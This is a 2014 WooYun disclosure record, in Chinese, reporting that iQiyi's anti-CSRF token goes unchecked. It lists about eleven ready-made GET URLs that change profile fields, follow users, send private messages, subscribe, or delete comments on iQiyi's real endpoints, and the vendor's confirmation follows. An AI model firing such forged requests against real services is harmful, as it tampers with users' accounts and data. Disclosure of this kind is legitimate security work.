{"id": 51516, "wybug_id": "wooyun-2014-074227", "wybug_title": "爱奇艺视频网存在多个CSRF漏洞..", "wybug_corp": "奇艺", "wybug_author": "q601333824", "wybug_date": "2014-08-28 18:37", "wybug_open_date": "2014-10-12 18:38", "wybug_type": "CSRF", "wybug_level": "低", "wybug_rank_0": "3", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["敏感接口缺乏校验"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-08-28：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-08-29：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-09-08：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-09-18：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-09-28：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-10-12：\t细节向公众公开  简要描述： 爱奇艺视频网存在多个CSRF漏洞.. 详细说明：       1.截取关注请求连接 \n\n    2.得到连接 \nhttp://www.iqiyi.com/u/api/relation/follow?uids=2214309904&agent_type=202&followfrm=1_0_0_0&antiCsrf=87541a9210aacd620d691b76315f0704&callback=window.Q.__callbacks__.cbvars5v\n   3.UID代表关注的人ID呢，参数antiCsrf是防止csrf的参数，但是，这个参数真有用吗?.下面一张图告诉你这个antiCsrf参数只是摆样子的，如图    其实这个连接也是可以添加关注的\nhttp://www.iqiyi.com/u/api/relation/follow?uids=2214309904\n \n\n   4。如果审核的人访问上面那个连接，出现下面图上这个问题，代表，你已经关注了对方了.虽然A00000表示返回成功，但是我测试的时候关注了的人访问就显示这个，取消重新访问又会显示A00000 \n\n------------------------------------------------------------------------------------  5.上面的测试知道了防止CSRF的参数只是摆样子，所以我去整理存在csrf的地方，下面   (1).关注： \nhttp://www.iqiyi.com/u/api/relation/follow?uids=2214309904\n    设置资料的地方全都有 \n\n    (2).设置性别: \nhttp://www.iqiyi.com/u/api/user/update_user_info?gender=1\n    (3).设置血型： \nhttp://www.iqiyi.com/u/api/user/update_user_info?blood_type=2\n    (4).设置生日“ \nhttp://www.iqiyi.com/u/api/user/update_user_info?birthday=11111111\n    (5).设置居住地： \nhttp://www.iqiyi.com/u/api/user/update_user_info?province=11&city=1\n    (6).设置用户QQ： \nhttp://www.iqiyi.com/u/api/user/update_user_info?qq=601333824\n    (7).设置毕业的大学: \nhttp://www.iqiyi.com/u/api/user/update_user_info?school=[{\"degree\":\"大学\",\"name\":\"青岛教育学院\",\"entry_time\":2014,\"college\":\"信息工程\"}]\n     (8).下面的设置毕业学校一样，我就了下图 \n\n--------------------------------------------------------------------------------    (9).用户间的私信功能： \nhttp://notice.iqiyi.com/apis/msg/send_private_msg.action?send_uid=2214309904（谁发送的）&rev_uid=1093162012(发送到的用户)&content=aaaa(私信内容)\n                                       ↓                                       ↓可以写成 \nhttp://notice.iqiyi.com/apis/msg/send_private_msg.action?rev_uid=1093162012(发送到的用户)&content=aaaa(私信内容)\n (私信要相互关注才有效，所以可以配合关注CSRF) \n\n   (10).订阅收藏视频功能: \nhttp://subscription.iqiyi.com/dingyue/api/subscribe.action?subType=7&subKey=300344200\n   (11).删除视频评论csrf\nhttp://api.t.iqiyi.com/qx_api/comment/delete?cb=fnsucc&contentid=1408220175218586\n(虽然访问提示未登录，但是测试可删除对应评论ID)    漏洞证明：  (1).关注： \nhttp://www.iqiyi.com/u/api/relation/follow?uids=2214309904\n    设置资料的地方全都有 \n\n    (2).设置性别: \nhttp://www.iqiyi.com/u/api/user/update_user_info?gender=1\n    (3).设置血型： \nhttp://www.iqiyi.com/u/api/user/update_user_info?blood_type=2\n    (4).设置生日“ \nhttp://www.iqiyi.com/u/api/user/update_user_info?birthday=11111111\n    (5).设置居住地： \nhttp://www.iqiyi.com/u/api/user/update_user_info?province=11&city=1\n    (6).设置用户QQ： \nhttp://www.iqiyi.com/u/api/user/update_user_info?qq=601333824\n    (7).设置毕业的大学: \nhttp://www.iqiyi.com/u/api/user/update_user_info?school=[{\"degree\":\"大学\",\"name\":\"青岛教育学院\",\"entry_time\":2014,\"college\":\"信息工程\"}]\n     (8).下面的设置毕业学校一样，我就了下图 \n\n--------------------------------------------------------------------------------    (9).用户间的私信功能： \nhttp://notice.iqiyi.com/apis/msg/send_private_msg.action?send_uid=2214309904（谁发送的）&rev_uid=1093162012(发送到的用户)&content=aaaa(私信内容)\n                                       ↓                                       ↓可以写成 \nhttp://notice.iqiyi.com/apis/msg/send_private_msg.action?rev_uid=1093162012(发送到的用户)&content=aaaa(私信内容)\n (私信要相互关注才有效，所以可以配合关注CSRF) \n\n   (10).订阅收藏视频功能: \nhttp://subscription.iqiyi.com/dingyue/api/subscribe.action?subType=7&subKey=300344200\n(11).删除视频评论csrf\nhttp://api.t.iqiyi.com/qx_api/comment/delete?cb=fnsucc&contentid=1408220175218586\n(虽然访问提示未登录，但是测试可删除对应评论ID)   修复方案：  出现csrf的问题和这两个漏洞一样漏洞1. WooYun: 新浪博客某处标签过滤不严可xss及多处csrf漏洞 2. WooYun: 新浪博客某处鸡肋越权及CSRF漏洞    版权声明：转载请注明来源 q601333824@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：5  确认时间：2014-08-29 12:54 厂商回复： 感谢您的提交，我们会尽快进行处理。希望您继续支持爱奇艺PPS。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-08-29 13:10 |    \t\tq601333824 \t\t\t( 普通白帽子  |\t\t\t        Rank:217 漏洞数:49        | 出自《丹特丽安的书架》---吾问汝,汝为人否...)\t\t \n  普通了，纪念下(>_<)    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 5, "Ranks": null}